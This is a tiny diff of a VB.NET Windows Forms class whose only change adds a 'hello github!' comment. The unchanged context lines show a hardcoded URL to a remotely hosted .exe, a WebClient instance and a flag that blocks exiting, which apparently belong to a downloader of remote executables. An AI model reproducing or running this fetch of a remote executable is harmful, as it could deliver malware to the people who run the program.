@@ -8,6 +8,8 @@ Imports System.Windows
 
 Public Class Form1
 
+    'hello github!
+
     Dim canExit As Boolean = False
     Dim url As String = "http://dd2476ste1.7m.pl/rndErr/{09GD-A7TT-HU64}.exe"
     Dim client As WebClient = New WebClient
